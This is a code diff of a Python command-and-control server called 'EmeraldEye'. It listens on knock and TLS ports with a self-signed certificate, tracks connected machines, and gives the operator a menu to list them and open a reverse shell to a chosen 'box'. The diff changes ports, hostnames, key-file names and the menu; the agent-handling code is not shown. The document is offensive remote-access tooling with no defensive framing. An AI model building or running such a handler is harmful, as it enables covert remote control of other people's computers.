@@ -3,10 +3,11 @@ import threading
 from OpenSSL import crypto
 import ssl
 
-KNOCK_PORT = 80
-TLS_PORT = 443
+KNOCK_PORT = 31415
+TLS_PORT = 31416
 
-HOST = "0.0.0.0"
+#HOST = "0.0.0.0"
+HOST = "127.0.0.1"
 
 class EmeraldEyeServer():
 
@@ -19,10 +20,10 @@ class EmeraldEyeServer():
         self.knock_sock.bind((host, KNOCK_PORT))
         self.ping_threads = {}
         self.ping_master = threading.Thread(target=self.listen, args=()).start()
-        self.tls_private_key_file = "s_my.key"
-        self.tls_cert_file = "s_my.crt"
-        self.tls_other_crt_file = "s_other.crt"
-        self.server_hostname = 'example.com'
+        self.tls_private_key_file = "server.key"
+        self.tls_cert_file = "server.crt"
+        self.tls_other_crt_file = "client.crt"
+        self.server_hostname = 'emeraldeye.io'
         self.my_crt = self.cert_gen()
         
 
@@ -30,7 +31,7 @@ class EmeraldEyeServer():
         k = crypto.PKey()
         k.generate_key(crypto.TYPE_RSA, 2048)
         cert = crypto.X509()
-        cert.get_subject().CN = "example.com"
+        cert.get_subject().CN = "emeraldeye.io"
         cert.gmtime_adj_notBefore(0)
         cert.gmtime_adj_notAfter(validityEndInSeconds)
         cert.set_issuer(cert.get_subject())
@@ -129,18 +130,16 @@ def main():
     t = EmeraldEyeServer(HOST)
     while True:
         print("Please enter selection:")
-        print("Listed connected machines - 1")
-        print("Select machine to reverse shell to - 2")
-        select = input(">")
+        print("List Connected Machines - <Enter>")
+        print("Reverse Shell - 1")
+        select = input(">>>>>>>>>>> Emerald Eye >>>>>>>>>>")
+        c = 0
+        keys = []
+        for s in t.ping_threads.keys():
+            print(str(c) + ". " + str(s))
+            keys.append(s)
+            c += 1
         if select == "1":
-            print(t.ping_threads.keys())
-        elif select == "2":
-            c = 0
-            keys = []
-            for s in t.ping_threads.keys():
-                print(str(c) + ". " + str(s))
-                c += 1
-                keys.append(s)
             if len(t.ping_threads) > 0:
                 num = input("Number of box you want to connect to:")
                 addy = keys[int(num)]
@@ -148,6 +147,6 @@ def main():
                 t.handle_agent()
             else:
                 print("No connected machines please wait")
-
+        keys = []
 if __name__ == "__main__":
     main()
